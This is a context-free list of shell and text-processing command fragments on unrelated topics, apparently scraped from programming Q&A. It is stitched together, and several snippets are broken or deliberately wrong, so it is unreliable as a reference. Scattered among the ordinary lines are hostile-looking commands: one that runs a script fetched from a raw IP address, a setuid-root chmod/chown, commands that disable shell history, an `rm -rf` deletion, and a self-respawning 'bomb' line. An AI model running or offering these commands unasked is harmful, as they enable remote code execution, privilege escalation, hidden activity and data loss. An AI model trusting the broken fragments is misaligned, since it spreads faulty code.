shell=$(dirname $(readlink -f $0))"/wpshell.php"
shell=$(dirname $(readlink -f $0))
if [ -t 0 ]; then
while [ true ]; do
/usr/local/bin/php $shell
if [ $? -eq 0 ]; then break; fi
/usr/local/bin/php $shell
set -f
read -s input
echo $input | /usr/local/bin/php $shell stdin
"C:\path\to\php" "C:\path\to\wpshell.php"
cat *.txt >> all.txt
echo "$var"
gem env
. ~/.bashrc
gem install ...
sudo gem install ...
echo 'PATH=$PATH:above/path/to/gems' >> ~/.bash_profile
rvm requirements
brew doctor
gem env
cd /usr/bin && ln -s /usr/local/Cellar/ruby/1.9.3-p194/lib/ruby/gems/1.9.1/gems/jekyll-1.4.3/bin/jekyll jekyll
sudo gem install jekyll
bundle install --force
bundle exec jekyll serve
jekyll serve
locate jekyll
bundle exec jekyll serve
GEM PATHS
" hello world"
"hello world"
#!/bin/bash echo "hello world"
system('sh http://1.1.1.1/yourscript.sh')
echo {} | tr [:upper:] [:lower:]
tr [:upper:] [:lower:]
-mindepth 1
mv . .
ls | head -1
ls | head -1 > output.txt
head -1
ls --color=always
/bin/ls | head -1 > output.txt
if [ "$DELETE$UPDATE$NEW" = "YESYES" -o "$DELETE$UPDATE$NEW" = "YESYESYES" ]; then
echo $dbpass
source script.sh
. script.sh
awk 'NR % 2' file.txt
awk 'NR % 2==0' data
sed 'N;s/\n//' file.txt
cat file.txt | awk 'BEGIN { lno = 0 } { val=$0; if (lno % 2 == 1) {printf "%s\n", $0} else {printf "%s", $0}; ++lno}'
user@host abc/cde$
user@host /home/krg85/github$
user@host ../github$
artist - year - album - [encoding information]
artist1 - year - album - [flac]
artist1 - year - album - [mp3]
artist1 - year - album - [AAC]
ls --color=yes
man ls
ls -l --group-directories-first -X --color=always | tail -n +2
screen -DR
ls $downloadDir -a1 | grep '[^.].*bin' | head -1
[[ ]]
while IFS= read -r line; do
-e create
mv f f.bak
cat, cut, grep
$(< file)
$(< ...)
do while
while IFS
for line
ECOS="line1Val line2Val line3Val"
echo 'Hello'
git pull && whoami
git pull && whoami
service apache2 start
-d -m
nohup command &>/dev/null &
head -n middleLine dump.sql > output
sed -n -e 123456p your.dump
date +%s
kill $me
man bash
"read svar"
"read svar"
"read svar"
/cygdrive/c/MyScripts/Bash.sh | cat -A
seq 10 | xargs echo
seq 10 | xargs -n 3 echo
ls *jpg | xargs -n 3 flickr_upload
shift $(($OPTIND-1))
getopts "o:"
ruby1.9 -ine '#some statement' src/**
e:1:in 'gets': Is a directory
cat file1 | tr -d "\n" > file2"
-o myOutputFile.js
closure myJSFile.js myOutputFile.js
sudo su -
su -
crontab -e
crontab -e
chmod +s scriptname; chown root scriptname
bash -c cmd
./generate.sh MyClass
info "(bash)Bash Variables"
sed 'X,Yd' < file
sed 'X,+Yd'
sed /regex/,Yd'
sed '/regex/,+Yd'
sed '/regex/,/regex/d'
sed -n '1,${p;n;n;n;}'
man sed
bash /path/to/mysql-backup.sh
#! /bin/bash
find . -type f -exec mv "{}" "{}.mp3" \;
for i in *
for i
(( .... ))
var=$(( ... MathStuff ...)) OR var=$( ... stringStuff ... )
(( ... ))
[[ "$line" = "\#*" ]]
awk -F'#' '{print $1}' t.txt
awk 'NF > 0'
awk '{print "address=/"$0"/127.0.0.1"}'
source scriptname
. scriptname
pip install dragonmapper
set -e
bash -x
set -x
set +x
set -x
chkconfig --list | grep named
service named start
chkconfig on named
* * * * *
#!/bin/bash -x
grep "some expression" index
egrep -v "^[[:blank:]]*#"
egrep -v "^[[:blank:]]*(#|$)"
This morning, I ate 3^12 apples.
This morning, I ate $3^12$ apples.
Yesterday, I ate 12345^6789 carrots.
Yesterday, I ate $12345^6789$ carrots.
cat -n thefile
PATH="/usr/bin ... /root/.rbenv/shims"
info "(bash)Redirections"
git push
sort -n k14
auto-complete feature
cmd="$1"; $cmd
command="some cmd"; safeRun command
safeRun some cmd
printf "Error: [%d] when executing command: '$command'" $ret_code
safeRunCommand "$command"
ls -l
typeset cmnd="$*"
typeset cmnd="$1"
find $1
find "$1
-Dprop=foo bar
name is
no names found
name is
no names found
chmod 775 timeit.sh
chown jon timeit.sh
man time
time [option...] command [arg...]
-o FILE  --output=FILE
-a  --append
-o FILE  --output=FILE
-p  --portability
SHOW COLUMNS FROM table WHERE Field != 'col_name' AND Field != 'col_name';
show columns
sort -k3rn
<<CSH_BLOCK ... CSH_BLOCK
cat <file>
brew install mongodb
sudo mkdir -p /data/db
sudo chmod 0755 /data/db
sudo chown mongod:mongod /data/db
chown: mongod: Invalid argument
ls -ld /data/db
./mongod --dbpath /data/db --port 27017
./mongo --port 27020
&gt; echo -e "\033[31m -- Hello World! -- \033[m" | less -R
&gt; echo -e "\033[31m -- Hello World! -- \033[m" | less -r
less -R
./script.sh This is a sentence
GNU bash, version 3.2.25(1)-release (x86_64-redhat-linux-gnu)
{ ... }
( ... )
{ ... }
/bin/echo -n
shopt -u xpg_echo
javac ...
echo javac ...
-crop WxH+X+Y
test -n
export PROMPT_COMMAND="source ~/.bashrc"
set -xv
#! /bin/bash
find . -type f -exec ls -la {} \; | cut -d ' ' -f 6- >$(date "+%Y.%m.%d-%H.%M.%S").ver
cat somefile.log > $(date "+%Y.%m.%d-%H.%M.%S").ver
ls > $(date "+%Y.%m.%d-%H.%M.%S").ver
response=$(curl --write-out %{http_code} --silent --output /dev/null servername)
tail -n1
echo -n . >> $LOGFILE
ls -l
sed -i '$ d' filename
sed -e '1d' -e '$d' -i filename
cat file1 | sed "1,1d; $d" > file2
( command1 ) ; ( command2 )
diff: extra operand 'AL'
diff -iy
diff <(command1) <(command2)
callpairs "sort -f" file1 file2 file3
mktemp -d
diff -u input.txt output.txt
man test
while true
man bash
env -i ./myscript.sh
mvn cli:execute-phase
mvn cli:execute-phase | colorize.py
substitution file
replacement file
in-line sed
\b:=word boundary
sed script
-f option
perl script.pl /file/to/modify
--follow=name --retry
-f, --follow[={name|descriptor}]
--follow=name --retry
man grep
man mount
. helperfile.sh
-E option
if then else
find . -type f -exec ./script.sh {} \;
func=$( ...echos... )
04 John Barleycorn.m4a
2-04 John Barleycorn.m4a
Bad substitution
sh test.sh
bash test.sh
echo "I'm a student"
xrdb -merge ~/.Xresources
Ubuntu 10.10
display: command not found
man mail
brew install swaks
swaks --to user@example.com --server smtp.example.com
<g transform="translate(0.000000,980.000000) scale(0.100000,-0.100000)"
vi filename
test -f
sh build.sh
bash build.sh
[ ... ]
[ string ]
Some title
mkdir folder1/folder2/folder3
man find
Argument list too long
echo your_command_line
read var
-h option
-h option
du -k
-h option
-h option
Internal Field Separator
egrep "^${user}$"
$(ls -d */|grep -v ^ref-)
ls | grep yourRegexHere
find -type d
pattern with -not -name
-exec option
{} \;
-depth n
sum FILENAME
cksum * > /tmp/blah
sort /tmp/blah | uniq -w 10 -d > /tmp/blah.dups
cut -d" " -f3 /tmp/blah.dups | xargs rm
for loop
a && b && c
a - &&
b - &&
c - END
a && (b | c) || d && e || f
(operator, arg1, arg2)
sed ':a;N;$!ba;s/\n/ /g'
sed ':a;N;$!ba;s/\n/ /g'
This is an example.txt
echo $C
00 01 11
wc -w decrypt.txt|cut -d " " -f1
set +H
true && cmd
false || cmd
$( .. )
cut ...
cut by column
cut -c...
cut -d " " -f 6-13 INPUT_FILE | sed -e '/^$\|^[A-Z]/d' -e 's/^ //g'
man bash
bc -l
exec {FD}> file.${FD}
perl -ne 'print length($_)." $_"' file | sort -r -n | cut -d ' ' -f 2-
perl -ne 'push @a, $_; END{ print reverse sort { length $a <=> length $b } @a }' file
ls /mydir/*.txt
man xargs
-L <#lines>
-n <#args>
-I <string>
2> /dev/null
 [gone]
head -1
cut -d= -f3
| uniq
head -1
cut -d= -f3
head -1 file | cut -d= -f3
>> output
man grep
/line number
cat file | grep -n pattern
grep -n pattern file
(( ))
(( 0 ))
(( 1 ))
$(( ))
$(( ))
if (function() == false)
(( ))
[ ... ]
[ ... ]
[[ ... ]]
brew install tree
sudo port install tree
brew install tree
start function
(time $cmd)
(time ./myprog)2>times.log
(time ./myprog)2>>times.log
sort -n
printf "%s\n" $@ | sort -n
dirs+(a b)
a b c
AaB AbB AcB
bagels/inner pancakes/inner
find bagels/inner pancakes/inner -maxdepth 1 -mindepth 1 -type d -name innerofinner
ping -c 5 -q $host | grep ?
ping -c 5 -q
print $0;
^.*(time=.+ ms).*$
(time=.+ ms)
help read
{ cat /tmp/file ; echo '#'; } | read -d# a b
head -2
cat fileName | awk '!((NR - 0) % 2)' 
set -u
 || true
__gitdir() { :; }
tr -d
${mean/$(printf "\r")/}
:set ff?
:set ff=unix
:set ff=dos
"Do you like Pie? [Yn]> "
for file in ./*.[ch] ; do echo "$file" ; done
xargs -0
mv -from -to
mv ./-from ./-to
$(dirname $file)
make install
set -e
set -e
tar xzf foo.tar.gz || exit 1
mv -v
help exec
comm -1 oldfile newfile
mv -f combined oldfile
" *"
useradd $var1 -p var2 -g var3
set -xv
echo ${0#/.*#}
M-x delete-file
C-x C-s
export PYTHONSTARTUP=/home/miki725/.pythonrc
echo "MOD is $mul"
echo hiding files
[[ ]]
man bash
[[ ]]
man bash
CONDITIONAL EXPRESSIONS
[[ ]]
make -j 5
sem --wait
. data.saved
Test Tester
[a-zA-Z0-9\-\.\/:=_ ]*
-type d
for loop
for loop
bzr info
bzr info
bzr reconfigure --standalone
bzr info
basename $file_path
chmod a+x /path/to/file
echo $FAV_NUMBER
source ~/.bashrc
( "path/to/script" )
source myshellfile.sh
$(source SCRIPT_NAME)
$ wget -F -i <html_file>
$ man wget
svnlook cat
diff oldfile newfile | grep '^< ' | cut -b3-
$ echo -e "\e[?1000h"
$ while read -n 6; do echo hellowworld; done
pgrep -f my_script_name
for i in {1..10} ; do sleep 10 & done
perl -ne ...
read -r
kill %"$REPLY"
kill %1
kill 1
while read -r ; do kill %"$REPLY" ; done
for i in {1 .. $num}
for i in "{1" .. "$num}"
for i in $(bash -c "{1..$num}")
kill 0
kill $(jobs -p)
set -m
ps -o pgid= ${some_pid}
kill -9
printf ''
GNU sed version 4.1.5
java -cp ../dependency.jar:. a.b.c.Main
curl -V
Accept-Encoding: gzip
submodule foreach 'git co master; git up'
pull --rebase
git submodule
git submodule
git submodule foreach
submodule foreach
git submodule
foreach [--recursive] <command>
tail -n +2 $FILE
done < $FILE
C-X: "ls"
C-SPACE: menu-complete
bind -p
bind -P
bind -s
bind '"key": command'
bind '"key":"keystrokes"'
bind -x '"key": shell-command'
-7 days
sudo apt-get install
ls -al
sh changedir /etc ls
declare -r a="$(start_log_ctx)"
stop_log_ctx_by_job "$a"
sh -c
bash -c
"sh -c ls"
ls -ltga
"ls -ltga"
sh -c "command plus arguments"
"rm *.c"
rm *.c
XXX blah blah.ext
XXX - XXX blah blah.ext
egrep -o "[[:digit:]]*"
man test
then  echo | wc -l
man amixer
ssh -n
read line
read line
du -sh
./repeat.sh du -sh
while [ $num -ge "COLUMN3" ]
read -e -p "something: " -i "this" $variable
nfile_location = /home/virtual/$1
HERE OK
source /etc/profile.d/bkUp.sh
source /etc/profile.d/bkUp.sh; asBackup -b '/home/backup/esa/${node}'
[[ "$yesno" = "ja" ]]
cmp -l file1 file2
paste -d '' - -
let COUNT=$FIRSTV-$SECONDV
let COUNT=FIRSTV-SECONDV
| sed 's/.*] \(.*\)/\1/'
[Mon Dec 05 12:01:03 2011] [error] [client a.b.c.d]
| sed 's/[0-9]*//g'
| sort | uniq
awk '/begin/,/end/'
grep -n
-B 1
-B 1
grep -b
<(printf '%s\n' "${table[@]}")
$0 &
$0 &
/home/user/bin/bomb foo bar
$0 &
-type f
chmod +w /<your project directory>
permission denied
ln -s /etc/init.d/lighttpd /etc/rc2.d/S99lighttpd
Python 3
echo "$a / $b" | bc -l | sed -e 's/^-\./-0./' -e 's/^\./0./'
[[ $r =~ ^[1-9].*$ ]]
scripty.sh ls /
ls /
Valid command
scripty.sh ls /some/nonexistent/directory
ls "/Library/Application Support"
s3cmd du -H $USAGE
s3cmd du -H s3://$USAGE
echo -ne
curl --location http://destination.com
-w/--write-out <format>
curl -w "%{redirect_url}" http://someurl.com
git gui
git commit
$(pgrep -u user Xvnc)
info "(bash)Command Substitution"
ps $(pgrep -u user Xvnc)
set -x
for n in $STAT; do echo "$USER is on :$n"; done
perl -ne
info "(bash) Tilde Expansion"
command --option=~/foo
command --option="$HOME/foo"
cd "$(dirname "$0")"
Ctrl + x
ls -l
cat pipe&
set -x
set +x
set -x
set +x
set -x
press space
UP arrow
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
tail -f | grep ... | some_other_prog
for line in file
rename 's/^.*-doc-/doc-/' *.txt
done < cat foo.txt
sort | uniq -c
read count name value
alias kapow='grep'
:!kapow "dude"
-p 3 2338
set -x
tr '[z-a]' '[a-z]'
tr '[a-c]' '[c-a]'
tr: [c-a]: invalid destination string
tr "[a-z]" "[$( revCharRange a-z )]"
revCharRange a-z
sed -r 's/\b[A-Z]\w*//g'
python /path/to/rsync_script.py $EMAIL "$RSYNC $PATH1 $PATH1_BACKUP"
scripts/rsync.sh: line 32: $'admin@mydomain.com\r': command not found
python /path/to/rsync_script.py EMAIL "RSYNC PATH1 PATH1_BACKUP"
export MYVAR="$(dirname "$(dirname "$(dirname "$(dirname $PWD)")")")"
export MYVAR="$(dirname "$(dirname "$(dirname $PWD)")")"
export MYVAR="$(dirname "$(dirname $PWD)")"
echo $(cd ../ && pwd)
nth_path=$(cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && cd ../../../ && pwd)
function2 : not found
nohup sleep 1 > nohup.out &
nohup: ignoring input and redirecting stderr to stdout
nohup sleep 1 &> nohup.out &
nohup ls -1 *.txt | sed -e "s%\(.*\)%/home/user/scripts/script.pl -find \1 %" | sh > nohup.out &
nohup: ignoring input and redirecting stderr to stdout
nohup ls -1 *.txt | sed -e "s%\(.*\)%/home/user/scripts/script.pl -find \1 %" | sh &> nohup.out &
nohup: ignoring input and redirecting stderr to stdout
chmod +x
-n 1
({arg}) => {body}
xargs -I {arg} [other options] {body}
:help w!
touch test.txt
touch: cannot touch test.txt: No space left on device
for (0 .. $#data/3)
a Big Apple
*GLOBAL\ MOBILE\ OPERATOR*
whois $ip | read line ; case "${line}" ....
air, voda, gmo
&> /dev/null &
silent inksc
silent inkscape
exec "$@" &> /dev/null &
complete -F _command silent
complete -F launch
m ? m : n
alias eclipse
bash: alias: eclipse: not found
sudo su -
alias eclipse
alias eclipse='/usr/local/eclipse/eclipse'
su - myusername
alias eclipse
alias eclipse='/usr/local/eclipse/eclipse'
#!/usr/bin/env bash
awk -f logging_script.awk mac_list.txt
set -vx
ssh -X
ssh -X
ssh -X root@localhost
system("/usr/bin/firefox -display=:0")
system($program, @args)
wc -l
wc -l
echo -n "$x: " ; open_file $x | wc -l
expr $(open_file $x | wc -l) / 4
"(" unexpected
array=( 1 2 3 4 5 )
kdialog $ARGS
eval kdialog $ARGS
print $colawk
print colawk
yum -y install $PACKAGES
rpm --query --queryformat "" $PACKAGES
package <name> is not installed
++$cnt % 3 ? "" : " $str"
" $str"
echo $e
while read... done
echo ${arr_a[@]#arr_b[@]}
sed -n '/aStyle.Landscape {/,/}/p'
sed '/aStyle.Landscape {/}/s/aStyle.Landscape {/something/'
sh xx < xx.css
[ $_V -eq 1 ]
log "some text"
$echoLog "Doing something verbose log worthy"
su -c
su -c ./script.sh
ls --color
dircolors -p .dircolors
source ~/.bashrc
ffmpeg -f x11grab -s cif -r 25 -i :0.0 /tmp/out.mpg
pkill ffmpeg
ls --color=auto
java myprogram
> file
> file_output_name
foo 2> /tmp/somefile
mkdir -p
yes -- -tcp
info yes
-', precede it with
$(echo test)
Man stat
man touch
find /home -type d -mtime -7
for pair in "share1_backup log_file"
for pair in "${share1_backup} ${log_file}"
echo ""
help echo
which echo
${parameter@operator} - E operator
echo -e
perl -e
screen -p 0 -S $SCREEN -X eval 'stuff \"stop\"\015'
r file
git status --porcelain
git diff --cached <path>
on commit
unset HISTFILE
unset HISTFILE
echo $HISTFILE
unset HISTFILE
$ set +o history
$ man set
cat infile | dos2unix | tr -d '\n' > outfile
cat infile | dos2unix | tr '\n' ' ' > outfile
ctrl-v, ctrl-m
pidof ProgName
tail -n +2|head -1
ps -o time
ps -o etime -C ProgramName
awk's split
-C ProgramName
`ps auxww
return 127
ESC [ ? 9 h
I get Warning: XTEST extension unavailable on '(null)'. Some functionality may be disabled; See 'man xdotool' for more info. x:654 y:453 screen:0 window:1665
xdotool mousemove
xdotool getmouselocation | sed -E "s/ screen:0 window:[^ ]*|x:|y://g"
sed -E 's/ screen:0 window:[^ ]*|x:|y://g' <<< $(xdotool getmouselocation)
type pwd
pwd &
info "(bash) Shell Builtin Commands"
pwd &
read &
man bash
man bash
man bash
man builtin
man pwd
git config author.email
git config author.name
git commit -m
git add -u
echo "alias commit='sh /path/to/script.sh" >> ~/.bash_profile
source ~/.bash_profile
export LESS=-R
less -+$LESS -FRX
LESS=FRSX less -+FRSX -FRX
git config --global core.pager less -R
git log --graph --pretty=format:"%C(yellow)%h%Creset%C(blue)%d%Creset %C(white bold)%s%Creset %C(white dim)(by %an %ar)%Creset" --all
bash --login -i
> /root/new_scripts/a.conf
2>&1 >/dev/null </dev/null
find . -name '*.java'
wc -l
sed '$d'
awk 'max=="" || data=="" || $1 > max {max=$1 ; data=$2} END{ print max " " data}'
head -n1
man bash
getent services ftp
ls -l
tar -cvpf tarfile.tar *
cd /
grep -o [aA][bB][cC]
echo "ABC" | grep -i abc
sed -e 's/\([a-z]\)\([A-Z]\)/\1-\L\2/'
sed -e 's/\(.*\)/\L\1/'
git add -N
git add -p
git add -p
read -r line
xargs -n 1
while read
/bin/sh -xv yourshellscript.sh
wc -l *.h *.cpp
wc -l *.h *.cpp | sort -n
man find
echo -ne "\e]62;New tab title\a"
trap 'echo -ne "\e]62;mrxvt: $USER@${HOSTNAME}\007"' DEBUG
trap 'echo -ne "\e]62;$USER@${HOSTNAME}[${pwd}]\007"' DEBUG
.. Servers .. password .. ''
awk '{print $1 " " $NF}'
[^ ]\+
[^ ][^ ]*
-type f
-type l
-o ExitOnForwardFailure=yes
declare -n
read < file
cat file | read
echo contents | read
xargs -0
xargs -d '\n'
ls -t
-d '\n'
xargs -0 ls
tail -1
ls -tr $(find /home/backups -name '*.gz' -o -name '*.tgz')|head -1|xargs rm -f
sed 's/foo\n/foo\t/g'
sort -u
| uniq -d
| uniq -u
| uinq -u | sort - <(sort -u
) | uniq -d
sort - <(sort -u
ls -v
cd /cygdrive/c/path/to/where/you/want/cygwin/to/start
fgrep -xc theusername thisotherfile
ls -1|grep -v '\.jar$'
-maxdepth 1
! -name '*.jar'
-maxdepth 1
ls test/!(*.jar|*.bar)
shopt -s extglob
man ls
ls -I
watch -d 'ls -I "*.gz"'
watch 'ls !(*.jar)'
sh: 1: Syntax error: "(" unexpected
set -f
set -f
set -f
set -f
set -f
set +f
set +f
cut -c$STRING_POS-67
bash father.sh
ps -alf
kill -9 24588
-bash: kill: (-123) - No such process
grep -f $template $output
find -delete
-exec rm
set -vx
echo start of .bashrc
echo end of .bashrc
tmux new-session
tmux new-window
bash -i
bash -l
tmuxp load ./myworkspace.yaml
tmuxp load
find -print0
\(utility originally written\)
-o option
shopt -s extglob
<a href="http://www.google.com">as google said</a>
git checkout
line 345
set -x
git checkout [tab]
set -x
cp -r sourcedir destdir
scp -r sourcedir user@targetmachine:destdir
double quotes
gconftool-2 -R /
gconftool-2 -R / | sed -n -e '/active =/p̈́' -e '/\.$/'
gconftool-2 -R / | grep '^active = ' | sed 's,\.[^.]\+$,,; s,.*\.,,'
cat *.txt
older answer
sort | uniq -c
for loop
for i in path/to/files; do cksum "$i"; done > cksum.txt
awk 'NR==FNR && a[$1]++ { b[$1]; next } $1 in b' cksum.txt cksum.txt
student 2
student 1
sudo adb
export PATH
Head -n<N> | tail -n1
shell script
sort | uniq
sort -u
./loo -d "full path with spaces"
#Content of bashrc
export AWK_REPO=~/bin/AWK
awk -f $AWK_REPO/myScript.awk $file
export PATH=${AWK_REPO}:${PATH}
myScript.awk $file
*.mp3: not a directory
echo hello
Hello, visitor!
You have created a new file!
find /etc -type f -name '*.conf'
ls -l
ls -l...
ls -l
arch linux
exit 31
curl -O
unzip filename.zip path/to/save
./scriptname -d
./scriptname -d path
-f from
source utils.conf
file not found
no such file or directory
case "$opt" in
man mv
help read
nc -l 12345
nohup /home/oracle/example/subscr.sh >temp-log.log &
disown -h
Permission denied
chmod a+x script.sh
/some path with whitespace/script.sh
chmod +x myscript.sh
wget --server-response -q "https://very.long/url/here" 2>&1 | awk -F"filename=" '{if ($2) print $2}'
gcc -Wall
read foo bar
1 2
$((true == false))
find -type d
| perl -ne 'print unless m/^\Q$previous\E\//; $previous = $_;'
find -maxdepth 1
find -maxdepth 1 -type d
ls -d *
ls -d */
ls -1
ls -C | cat
sed / awk
sed -i"bak" '/ORACLE_HOME/s/10\.2\.0"/11.2.0.2_org"/' file
adb install -r 'myproject/bin/MyApplication.apk'
$( cmd ... )
$( cat .... )
$( /usr/local/bin/khtml2png2 ...)
( ... khtml2png2  ... )
for line ...
$( .. cmd )
export LOGLEVEL="5"
history -s command
history -n file
date "+%Y-%m-%d"
stat <file> -c '%Z'
$(date +%s)
date -d "-7 days" +%Y%m%d
GNU Win32
sub function
program2 foo
tail -f /var/log/topscript.log
ssh -t user@host
./myscript.sh > topscript.log 2>&1
tail -f topscript.log
./test.sh: line 6: mv -f /home/test/dirpath/test.txt /home/test/mvdir: No such file or directory
CREATE DATABASE
command = "sed -i \"s*#{find_what}*#{replace_with}*\" #{file} "
sed -i "s*require_once('file.php');*\n    require_once(\$www_dir . \$path . '/file.php');\n           *" /var/www/something.php
require_once( .  . '/file.php');
exit 0
set -o errexit
mv $0.tmp $0
mv $0.tmp $0
exit 0
xdotool search --name "VLC" behave %@ focus exec 'myscript'
xdotool search --name "imagemagic" behave %@ focus getmouselocation
first file
second column
second file
help read
read -d " "
How to define "One line"
text without a '\n' at the end
One line
|| [[ $x ]]
[[hello123 : command not found
wget --post-data
if: Expression Syntax.
-not -empty
-type f
-printf '%h\n'
Ctrl+v <HOME>
sed: -e expression #1, char 19: unknown option to
echo $SHELL
ls -l /bin/sh
struct stat
cat ./script
"find ."
last execution timestamp
emacs newfile.py
[ $i
echo $f
fg %1
vim -E
shopt -s globstar
$(__git_ps1 " (%s)")
debug msg
print ">>>", $3
Process Substitution
tc file
return answer;
wWw.page.com  __ (576)_002
wWw.page.com\ \ __\ \(576\)_0.txt
wWw.page.com  __ (576)_002.txt file not found
java Main arg1 arg2
java.lang.ClassNotFoundException: Main
cat data_$N.dat | xargs ./program.exe > data_$N.dat
... > tmp_$$.dat
mv -f tmp_$$.dat data_$N.dat
ulimit -s unlimited
export OMP_STACKSIZE=4g
export KMP_STACKSIZE=4G
mpirun -n <numprocs> ulimit -s
00:01 2012-01-01
( %m - 1 ) / 3 + 1
cat file.ext | head -10 && cat file.ext | tail -10
cat file.ext | tail -10 && cat file.ext | head -10
(cat file.ext | head -10 && cat file.ext | tail -10 ) | your_program
head -10 file.txt; tail -10 file.txt
standard text editor
head fiename_foo && tail filename_foo
head_and_tail filename_foo
sed -n -e 1,+9p -e 190,+9p  textfile.txt
a.out | (head; tail)
headtail 10
headtail -10
brew install gawk
chmod u+x
ls -l
END statement
set -e
(head -n 1; false)
head -n 1
set -x
set +x
set -x
[[ ... ]]
for i in {1..100000}; do ls 1>/dev/null; done
| wc -w
grep -o
/bin/sh -c <command>
... --exclude='*{.git,.svn}*' \\\"text\\\" ...
t.sh 1-17 18-29 30-39 input_file
rm -rf ~/bin
rm -rf ~/bin
rm -rf bin
rm -rf ~/bin/{*,.[^.]*}
echo -ne "\n"
/usr/bin/echo -ne "\n"
sed 's/|*$//'
sleep 60 &
mate app
echo $PWD
mate $PWD/app
mate .
open .
dialog --checklist
bash script.sh arg1
script arg1
chmod +x script.sh
./script arg1
script arg1
install -D -m700 /path/to/script $HOME/bin/script
grep passwordexpirationtime |awk -F ':' '{print $2}'
variable name
external variable
{print $formatarg}
cd ~/Do<tab>EP<tab>
export CDPATH=~/Documents
find . | grep "*_([0-9]\{1,2\})"
find . | grep "([0-9]\{1,2\})_*"
find -L . -type l -delete
mkdir -p /projects/$i/incoming/
i = 012-dfd
ln -s /incoming/foo /projects/$i/incoming/foo
for name in *
IFS = '\n'
for name in ls
for name in *
filename with spaces
new lines
--follow=name --retry
:set fileformat=unix
:set list
/bin/bash -c
ls -l
php -R
ls -l | php -r 'print_r(file("php://stdin"));'
awk -F. -v OFS=. '{$NF += 1 ; print}'
echo mv
grep -v grep
kill $(pgrep -f dmn)
(( ))
echo $result
U+2248 ≈ ALMOST EQUAL TO
PREC = 32767
grep whatever thefilename
while...done <thefile
line='example text'
crontab -e
mv -n "$JPEGFILE" "$DIRNAME"
'*/data/mod/myservice start some_parameter*'
'*/data/mod/myservice start*'
sudo cat newTask > /etc/rc.d/rc.local
-bash: /etc/rc.d/rc.local: Permission denied
sudo python scriptname
sudo command > filename
bash -x script
fuseiso iso.img /mount/point
isoinfo -l image.iso
isoinfo -x some/file.txt image.iso
man bash
$(( ))
man grep
System Preferences -> Network -> Advanced -> Proxies
networksetup -listnetworkserviceorder
networksetup -listallnetworkservices
java -cp yourjar.jar com.yourcompany.move.Main $*
sudo yum install audit
INPUTFILE-1.data, INPUTFILE-2.data, ...
env -0
xargs -0
files="$( find ./ -iname 'file*' -print0 | xargs -0 )"
xargs -0
sed -e 's/ /_/'
1.pdf 2.pdf 3.pdf 4.pdf ... n.pdf
convert 1.pdf 2.pdf output.pdf
location=$(dirname $0)
dirname $0
variable=$(echo "test")
variable=$(echo $(echo "test"))
$(dirname $(readlink -f $0))
$(dirname $0)
readlink -f $0
man readlink
man dirname
man cd
readlink -f $0
echo -n
for line in `cat $userList`
for ... in `cat ...`
: >(tee *.log)
-f -
bash --rcfile <(echo "export PS1='somethingelse>'")
man wget
HTML::TreeBuilder 3
2011-12-31 13:37
(for file in *)
> <file name>
find: bad option -maxdepth  find: [-H | -L] path-list predicate-list
rm toplev/midlev/anotherdirec/*
rm -rf toplev/midlev/anotherdirec/*
nn -
echo $file_name | sed "s/.*-\s*\(.*\)-.*/\1.ext/"
printf("%-10s : %s\n", -s, $_) for @files[0..9];
!(anything containing a / slash)
trap "ERROR=1" ERR
trap '[ "$ERROR" = "1" ] && on_error' EXIT
trap '...' ERR
1 2 3 h e l l o !
'%c '
[ -n "$str" ]
Hello 22.mp4
git add $FILE
git add "$FILE"
git add
set -x
git add $file
git ls-files
git ls-files
Unknown on line 0
grep apc.so /etc/php5/cli/ -r
x=$(echo {a..x})
source ./up.sh
. ./up.sh
rm -rf
echo $string
<<< $string
Age:\ ([0-9]*).*\ City:
not years
"& "
-exec command
convert -define jpeg:extent=2MB
convert dsc_big/* -define jpeg:extent=2MB dsc_small/
cmd /c command
echo ${deviceshortname}${now}
/bin/bash -x script.sh
#!/bin/bash -x
mkdir -p
sh //*sh;
sed -f
{ print $2 }
|sed ':a;N;$!ba;s/\n/ /g'
stat --format=%a
${VAR:-<default value>}
echo -n "..."
[READ] ...
Log File: ...
sleep 1
cat -v
-n NCHARS read returns after reading NCHARS characters rather than waiting for a complete line of input.
screen -L
cook, chef, fireman
Cook, Chef, Fireman
Format -> Change Case -> Sentence case
awk -f up.awk test.input >test.output
Format -> Change Case -> Sentence case
perl -pi.bak -we ...
perl script.pl file.csv > fileout.csv
print $0
$(( ))
ABC.rt1, ABC.rt2, ... , ABC.rt8
sh script.sh file.txt "|" 2
sh script.sh file.txt "|" 2 3
grep(/^0$/, @F[2..9])
sed 'N;/\n{/s// {/;P;D' $file
exec myprog &
uniq -c
sort -r
type f
$2 > current_max_value
head -c xx
mkdir -p
git clone --no-hardlinks templaterepo newrepo
cd newrepo
git filter-branch --tree-filter "rm -f sensitive/file1.txt file2.txt" HEAD
git add ...
git commit ...
git remote add origin git@...
git push origin master
git help filter-branch
echo ${!Y}
tclsh main.tcl
MyShell >
exec vim
MyShell >
info level
uplevel #0 $code
info script
info script {}
set ::tcl_interactive 1
function foo() { ls -1 $1; }
 foo /etc 
 ls -1 $1 /etc 
 ls -1 /etc 
| tail
 foo /etc 
 ls -1 $1 | tail /etc 
 ls -1 | tail /etc 
ls -1 /etc
ls -1 $1 /etc
tail /etc
sample1 sample2
sed -i -e ${st},${en}d
make -jX
1870    121 0 0
column 1
column 2
column 3
NR==FNR{if (b>$2) b=$2; if (c>$3) c=$3;next}
column 2
column 3
{if ($1-a>1) {x=($1-a); for (i=1;i<x;i++) {print (a+1)"\t"b,c,"0";a++};a=$1} else a=$1;print}
column 1
for loop
column 1
column 1
-exec <cmd> {} \;
# pwd
# ls -R | grep .txt | xargs -I {} open {}
The file /dir/reallyinsubfolder.txt does not exist.
which psql
brew install postgresql
brew install postgresql
psql -d stuff
cat -vet
sort | uniq -c
M file1.txt
' '
print "$_\n" for keys %found
emacs -nw
emacs --no-window-system
emacs -nw
export EDITOR="emacs -nw"
emacs —daemon
cut -b1-$(tput cols)
sed -u 'i\\o033[2K'
stdbuf -oL sed 'i\\033[2K'
stdbuf -o0 tr '\n' '\r'
| cut -b1-$(tput cols)
"$8 $9 ${10} ${11}"
quel ramo del lago di como che volge a mezzogiorno
quel filone del lago di como che volge a mezzogiorno
"data1 data2"
"data3 data4"
"data1 data2"
(\[| )apple( |\])
echo $abcd
echo ${abc}d
tr -d '\n'
blank line
exec xyzzy
sed -n "w ${DUMP_FILE}"
dd status=none of=${DUMP_FILE}
myscript.sh -filename somefilename -location some/file/location -deleteoption yes
read -0
sh -c
-n 1
find -exec
while read
s/\n/, /
-v ORS=,
sed 's/,$/\n/'
source somescript.sh
tset, reset
